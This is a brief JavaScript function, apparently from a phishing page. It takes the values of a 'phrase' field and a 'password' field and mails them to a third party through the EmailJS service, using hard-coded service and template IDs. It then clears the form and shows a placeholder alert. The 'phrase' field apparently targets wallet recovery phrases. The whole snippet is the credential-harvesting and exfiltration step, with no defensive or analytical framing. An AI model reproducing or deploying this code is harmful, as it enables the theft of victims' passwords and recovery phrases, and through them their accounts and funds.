function sendMail() {
    var params = {
        phrase: document.getElementById('phrase').value,
        password: document.getElementById('password').value,
    };
    const serviceID = "service_wl9o2fc";
    const templateID = "Ytemplate_7grl9yh";

    emailjs.send(serviceID, templateID, params)
        .then((res) => {
            document.getElementById('phrase').value = "";
            document.getElementById('password').value = "";


            console.log(res);
            alert("ypur message");

        })

        .catch((err) => console.log(err));


}


